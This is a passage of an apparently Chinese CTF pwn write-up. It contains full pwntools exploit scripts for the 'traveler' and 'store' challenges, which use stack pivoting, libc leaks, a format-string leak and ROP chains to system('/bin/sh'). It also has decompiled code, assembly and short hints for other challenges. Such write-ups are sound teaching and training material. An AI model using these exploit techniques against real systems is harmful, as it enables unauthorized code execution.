class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">one_gadget -f libc-2.31.so</span><br><br>0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)<br>constraints:<br>  [r15] == NULL || r15 == NULL<br>  [r12] == NULL || r12 == NULL<br><br>0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)<br>constraints:<br>  [r15] == NULL || r15 == NULL<br>  [rdx] == NULL || rdx == NULL<br><br>0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)<br>constraints:<br>  [rsi] == NULL || rsi == NULL<br>  [rdx] == NULL || rdx == NULL<br><br></code></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;Linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>banary = <span class="hljs-string">&quot;./traveler&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port = <span class="hljs-number">28855</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#----------------- 0. Gadget ----------------------</span><br>pop_rdi_ret = <span class="hljs-number">0x00000000004012c3</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x00000000004012c1</span><br>leave_ret = <span class="hljs-number">0x0000000000401253</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;puts_got&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;puts_plt&#x27;</span>)<br><br>bss = <span class="hljs-number">0x00000000004040A0</span> + <span class="hljs-number">0x400</span><br>read = <span class="hljs-number">0x0000000000401216</span><br>main = <span class="hljs-number">0x4011F4</span><br><br><span class="hljs-comment">#----------------- 1. stack_piviot ----------------------</span><br><span class="hljs-comment">#bss-0x20</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(bss) + p64(read)<br>sa(<span class="hljs-string">&#x27;who r u?&#x27;</span>, payload1)<br>sa(<span class="hljs-string">&#x27;life?&#x27;</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br><span class="hljs-comment">#----------------- 2. leak_libc  -------------------------</span><br><span class="hljs-comment">#read(0, 0x404480 ,0x30)</span><br>payload2 =  p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main) <br>payload2 += p64(bss-<span class="hljs-number">0x28</span>) +p64(leave_ret)<br>s(payload2)<br>sa(<span class="hljs-string">&#x27;life?&#x27;</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg(<span class="hljs-string">&#x27;puts_addr&#x27;</span>)<br><br><span class="hljs-comment">#libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pop_r12 = libc_base + <span class="hljs-number">0x000000000002f709</span><br>one_gadget = libc_base + <span class="hljs-number">0xe3afe</span><br><br><span class="hljs-comment">#----------------- 3. pwn    -------------------------</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(bss+<span class="hljs-number">0x80</span>) + p64(read)<br>s(payload1)<br>sa(<span class="hljs-string">&#x27;life?&#x27;</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br> <br>payload3 =  p64(pop_r12) + p64(<span class="hljs-number">0</span>) + p64(one_gadget) + p64(<span class="hljs-number">0</span>) <br>payload3 += p64(bss+<span class="hljs-number">0x80</span>-<span class="hljs-number">0x28</span>) + p64(leave_ret)<br>sl(payload3)<br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="2-store-in-tongxunlu"><a href="#2-store-in-tongxunlu" class="headerlink" title="2.store in tongxunlu"></a>2.store in tongxunlu</h2><p>提示：ubuntu20</p><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p><strong>保护</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/chen/桌面/match/VN/TONGXUN/store&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-string">PIE</span> <span class="hljs-string">enabled</span><br></code></pre></td></tr></table></figure><p><strong>eeee_wantboy</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">eeee_wantboy</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-130h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">36</span>]; <span class="hljs-comment">// [rsp+100h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+12Ch] [rbp-4h]</span><br><br>  v4 = <span class="hljs-number">0</span>;<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;halo little giegie,my name is eeee,i am 11111&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;can i get your phone number&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;if you give me your number,i will give you some hao_kang_de&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i get you ! little giegie&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heyhey , hao_kang_de is %lx \n&quot;</span>, v1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;anything want to say?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, v1, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-keyword">return</span> strtol(buf, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次输入，0x10字节的溢出，通过栈覆写ret，使得程序流复原</p><p>之后接受栈地址</p><p>第二次输入，布栈，</p><p><strong>hao_kang_de</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">hao_kang_de</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">signed</span> __int64 v0; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wait!! i will give you something&quot;</span>);<br>  v0 = sys_write(<span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hhhh~i just tell a joke&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>syscall，瞅汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000000087B 55                            push    rbp<br>.text:000000000000087C 48 89 E5                      mov     rbp, rsp<br>.text:000000000000087F 48 8D 3D B2 01 00 00          lea     rdi, s                          ; &quot;wait!! i will give you something&quot;<br>.text:0000000000000886 E8 25 FE FF FF                call    _puts<br>.text:0000000000000886<br>.text:000000000000088B 48 C7 C0 01 00 00 00          mov     rax, 1<br>.text:0000000000000892 48 C7 C7 00 00 00 00          mov     rdi, 0                          ; fd<br>.text:0000000000000899 48 C7 C6 00 00 00 00          mov     rsi, 0                          ; buf<br>.text:00000000000008A0 48 C7 C2 00 00 00 00          mov     rdx, 0                          ; count<br>.text:00000000000008A7 0F 05                         syscall                                 ; LINUX - sys_write<br><br>.text:00000000000008A9 48 8D 3D A9 01 00 00          lea     rdi, aHhhhIJustTellA            ; &quot;hhhh~i just tell a joke&quot;<br>.text:00000000000008B0 E8 FB FD FF FF                call    _puts<br>.text:00000000000008B0<br>.text:00000000000008B5 90                            nop<br>.text:00000000000008B6 5D                            pop     rbp<br>.text:00000000000008B7 C3                            retn<br></code></pre></td></tr></table></figure><p><strong>汇编</strong></p><p>重点放在最后几个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000000090B 48 8D 3D F2 01 00 00          lea     rdi, format                     ; &quot;i get you ! little giegie&quot;<br>.text:0000000000000912 B8 00 00 00 00                mov     eax, 0<br>.text:0000000000000917 E8 A4 FD FF FF                call    _printf<br>.text:0000000000000917<br><br>.text:000000000000091C 48 8D 85 D0 FE FF FF          lea     rax, [rbp+var_130]<br>.text:0000000000000923 48 89 C6                      mov     rsi, rax<br>.text:0000000000000926 48 8D 3D F1 01 00 00          lea     rdi, aHeyheyHaoKangD            ; &quot;heyhey , hao_kang_de is %lx \n&quot;<br>.text:000000000000092D B8 00 00 00 00                mov     eax, 0<br>.text:0000000000000932 E8 89 FD FF FF                call    _printf<br>.text:0000000000000932<br><br>.text:0000000000000937 48 8D 3D FE 01 00 00          lea     rdi, aAnythingWantTo            ; &quot;anything want to say?&quot;<br>.text:000000000000093E E8 6D FD FF FF                call    _puts<br>.text:000000000000093E<br><br>.text:0000000000000943 48 8D 85 D0 FE FF FF          lea     rax, [rbp+var_130]<br>.text:000000000000094A BA 00 01 00 00                mov     edx, 100h                       ; nbytes<br>.text:000000000000094F 48 89 C6                      mov     rsi, rax                        ; buf<br>.text:0000000000000952 BF 00 00 00 00                mov     edi, 0                          ; fd<br>.text:0000000000000957 E8 74 FD FF FF                call    _read<br>.text:0000000000000957<br><br>.text:000000000000095C 48 8D 45 D0                   lea     rax, [rbp+buf]<br>.text:0000000000000960 BA 0A 00 00 00                mov     edx, 0Ah                        ; base<br>.text:0000000000000965 BE 00 00 00 00                mov     esi, 0                          ; endptr<br>.text:000000000000096A 48 89 C7                      mov     rdi, rax                        ; nptr<br>.text:000000000000096D E8 6E FD FF FF                call    _strtol<br>.text:000000000000096D<br><br>.text:0000000000000972 89 45 F4                      mov     [rbp+var_C], eax<br>.text:0000000000000975 90                            nop<br>.text:0000000000000976 C9                            leave<br>.text:0000000000000977 C3                            retn<br></code></pre></td></tr></table></figure><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p><strong>一：非预期，但是很牛逼</strong></p><ol><li>第一次输入结束后，会给一个栈地址，要去接收。</li><li>在其前，有一次0x10字节的栈溢出，通过覆写ret末字节，进行一个短距离的迁移，使得再次执行main，此时也有栈地址了</li><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call h:<br>push rip (rsp -= 0x8)<br><br>h:<br>push rbp<br>mov rbp, rsp<br><br>leave:<br>mov rsp, rbp<br>pop rbp<br>ret:<br>pop rip<br></code></pre></td></tr></table></figure><p><strong>二：出题者思路</strong></p><p>利用sys_write进行泄露</p><h3 id="非预期exp"><a href="#非预期exp" class="headerlink" title="非预期exp"></a>非预期exp</h3><p><a href="https://blog.csdn.net/maple105890/article/details/129115700">https://blog.csdn.net/maple105890/article/details/129115700</a></p><p>太牛逼了，丝滑的一，人造格式化字符串漏洞</p><p>从而泄露libc，elf</p><p>再在栈上布置ROP，做栈迁移执行就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br> <br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./store&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><br><span class="hljs-comment">#-----------------------------1. ret_main + recv_stack   ---------------------------</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p8(<span class="hljs-number">0x79</span>)<br>p.sendafter(<span class="hljs-string">b&quot;if you give me your number,i will give you some hao_kang_de\n&quot;</span>,payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;is &#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&quot;stack_addr&quot;</span>)<br><span class="hljs-comment">#rsp = stack_add</span><br><span class="hljs-comment">#rbp = stack_addr + 0x130</span><br><br>p.sendafter(<span class="hljs-string">b&quot;anything want to say?\n&quot;</span>,<span class="hljs-string">b&#x27;Korey0sh1&#x27;</span>)<br><br>debug()<br><span class="hljs-comment">#-----------------------------2. fmt + leak_libc       ------------------------------ </span><br><span class="hljs-comment">#rsp = stack_add</span><br><span class="hljs-comment">#rbp = stack_addr + 0x120</span><br><span class="hljs-comment">#read(0, stack_addr+0x100, 0x40)</span><br><br>payload = <span class="hljs-string">b&#x27;%7$p|%11$p&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(stack_addr + <span class="hljs-number">0x240</span>) + p8(<span class="hljs-number">0x12</span>) <br>p.send(payload)<br><br>p.sendafter(<span class="hljs-string">b&quot;anything want to say?\n&quot;</span>,<span class="hljs-string">b&#x27;Korey0sh1&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">243</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elf_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x978</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;is &#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;elf_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(elf_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack_addr--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(stack_addr))<br><br>pause()<br><span class="hljs-comment">#-----------------------------3. ROP ------------------------------</span><br><span class="hljs-comment">#rsp = stack_add  + 0x140</span><br><span class="hljs-comment">#rbp = stack_addr + 0x240</span><br><br><span class="hljs-comment">#read(0, stack_add+ 0x110 , 0x100)</span><br><br><span class="hljs-comment">#call read: rsp -= 0x8</span><br><span class="hljs-comment">#rsp = stack_add  + 0x138</span><br><br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)) <br>pop_rdi = elf_base + <span class="hljs-number">0xa13</span><br>pop_rsi_r15 = elf_base + <span class="hljs-number">0xa11</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi) + p64(str_bin_sh) + p64(pop_rsi_r15) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)  + p64(sys_addr)<br>p.sendafter(<span class="hljs-string">b&quot;anything want to say?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="预期exp"><a href="#预期exp" class="headerlink" title="预期exp"></a>预期exp</h3><p>预期解思路：strtol控制rax，然后跳转到sys_write附近把elf_base和libc_base打出来</p><p>再布置ROP</p><p><strong>3.escape_langlang_mountain</strong></p><p>读一下把后门字符串写vnctf，write一次改command为cat flag，再读就能执行后门了</p><p>qemu</p><p><strong>4.hf</strong></p><p>提示：堆?</p><p><strong>5.鼠鼠的奇妙冒险</strong></p><p>提示：uaf in game.c&#x2F;fight()</p><p>​ptmalloc2对线程数&gt;CPU核心数*8时会去lock之前的arena并复用； </p><p>​线程结束时有tcache_thread_shutdown释放掉所有tcache chunks； </p><p>​合理利用loadLevel调整堆结构；</p><h1 id="④NSS-Round-9"><a href="#④NSS-Round-9" class="headerlink" title="④NSS#Round 9"></a>④NSS#Round 9</h1><h2 id="1-MyExec"><a href="#1-MyExec" class="headerlink" title="1.MyExec"></a>1.MyExec</h2><h3 id="ptrcl"><a href="#ptrcl" class="headerlink" title="ptrcl"></a>ptrcl</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 函数原型</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span 